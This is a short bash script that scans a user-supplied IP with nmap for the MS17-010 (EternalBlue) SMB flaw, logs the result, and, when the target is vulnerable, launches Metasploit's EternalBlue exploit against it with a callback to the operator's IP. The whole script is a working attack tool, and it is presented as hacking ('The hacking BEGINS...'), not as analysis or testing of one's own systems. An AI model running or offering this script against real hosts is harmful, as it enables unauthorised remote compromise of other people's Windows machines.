#!/bin/bash
    #my_ip=$(ip addr show | grep 'inet 192' | awk '{print $2}' | cut -d'/' -f1)
    echo "Check the target for the EternalBlue vulnerability"
    echo -n "Write the IP: "
    read target
    result=$(nmap -p 445 --script smb-vuln-ms17-010.nse $target | grep "State: VULNERABLE")

    if [ -n "$result" ]; then
        echo "BINGO!!! $target can be hacked using EternalBlue" > "eternalblue.txt"
        echo "BINGO!!! $target can be hacked using EternalBlue"
        
        while true; do
            read -p "Do you want to launch an attack? (Yes/No): " continue_input
            if [ "$continue_input" == "Yes" ]; then
                echo -n "Write your IP: "
                read ip
                echo "The hacking BEGINS..."
                msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $target; set processname lsass.exe; set LHOST $ip; run; exit"
                break
            elif [ "$continue_input" == "No" ]; then
                echo "See you soon =)"
                break 
            else
                echo "Please enter Yes or No"
            fi
        done
    else
        echo "Unlucky...$target cant be hacked using EternalBlue" > "eternalblue.txt"
        echo "Unlucky...$target cant be hacked using EternalBlue"
    fi
